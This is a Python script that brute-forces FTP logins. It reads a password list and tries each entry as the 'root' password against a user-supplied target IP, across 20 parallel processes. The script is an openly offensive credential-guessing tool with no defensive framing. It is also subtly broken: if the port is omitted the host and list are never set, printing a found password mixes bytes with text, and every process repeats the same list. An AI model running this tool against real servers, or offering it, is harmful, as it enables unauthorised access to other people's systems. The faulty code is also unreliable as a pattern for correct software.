#! /usr/bin/python3

import os
import time
import optparse 
import multiprocessing
import colorama 
import ftplib
from tqdm import tqdm


class Bruteforcer:
    def __init__(self):
        self.get_arguments()
        self.processes = 20

    def get_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-t","--target",dest="host",help="Type the ip of host that you want to attack")
        parser.add_option("-l","--list",dest="list",help="Pass me the absolute path of your password list")
        parser.add_option("-p","--port",dest="port",help="Chooce this if you want to change the port number for ftp service(default=21)")
        user_options = parser.parse_args()[0]
        if not user_options.host:
            parser.error("Type the ip of your target,type --help for more info")
        elif not user_options.list:
            parser.error("You have to pass me a password list!!")
        elif not user_options.port:
            self.port = 21
            pass 
        else:
            self.host = user_options.host 
            self.list = user_options.list
            self.port = int(user_options.port)

    def strip_words(self,wordlist):
        striped_list = []
        with open(wordlist,"rb") as wordlist:
            for word in wordlist:
                word=word.strip(b"\n")
                striped_list.append(word)
        return striped_list

    def bruteforcer(self):
        file_size = self.check_size(self.list)
        if file_size > 10000000:
            print("\rPlease wait...",end="")
        new_list = self.strip_words(self.list)
        connection = ftplib.FTP()
        for word in tqdm(new_list):
            try:
                connection.connect(host=self.host,port=self.port,timeout=3)
                connection.login(user="root",passwd=word)
                print("Password found >> " + word)                
            except KeyboardInterrupt:
                print("Exiting...")
                time.sleep(2)
            except ConnectionRefusedError:
                print("Host is down...")
                exit(0)
            except Exception:
                pass

    def check_size(self,wordlist):
        file = os.stat(wordlist)
        return file.st_size

    def start_process(self):
        process_pool = []
        for i in range(self.processes):
            process = multiprocessing.Process(target=self.bruteforcer)
            process_pool.append(process)
        for process in process_pool:
            process.start()

    def start(self):
        self.start_process()


bruteforcer = Bruteforcer()
bruteforcer.start()
